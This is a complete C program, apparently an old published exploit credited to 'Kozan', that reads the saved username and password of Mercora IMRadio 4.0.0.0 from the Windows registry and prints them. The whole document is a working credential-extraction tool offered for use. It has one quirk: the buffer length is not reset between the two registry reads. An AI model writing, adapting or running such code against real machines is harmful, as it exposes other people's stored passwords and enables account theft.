#include <stdio.h>
#include <windows.h>
#define BUF 100

int main()
{
       HKEY hKey;
       char Username[BUF], Password[BUF];
       DWORD dwBUFLEN = BUF;
       LONG lRet;

       if( RegOpenKeyEx(HKEY_CURRENT_USER,
                                       "Software\\Mercora\\MercoraClient\\Profiles",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey
                                       ) == ERROR_SUCCESS )
       {
               lRet = RegQueryValueEx(hKey, "Auto.Password", NULL, NULL, (LPBYTE)Password, &dwBUFLEN);
               if (lRet != ERROR_SUCCESS || dwBUFLEN > BUF) strcpy(Password,"Not Found!");

               lRet = RegQueryValueEx(hKey, "Auto.Username", NULL, NULL, (LPBYTE)Username, &dwBUFLEN);
               if (lRet != ERROR_SUCCESS || dwBUFLEN > BUF) strcpy(Username,"Not Found!");

               RegCloseKey(hKey);

               fprintf(stdout, "Mercora IMRadio 4.0.0.0 password disclosure local exploit by Kozan\n");
               fprintf(stdout, "Credits to ATmaCA\n");
               fprintf(stdout, "www.spyinstructors.com \n");
               fprintf(stdout, "kozan@spyinstructors.com\n\n");
               fprintf(stdout, "Username :\t%s\n",Username);
               fprintf(stdout, "Password :\t%s\n",Password);
       }
       else
       {
               fprintf(stderr, "Mercora IMRadio 4.0.0.0 is not installed on your system!\n");
       }

       return 0;
}

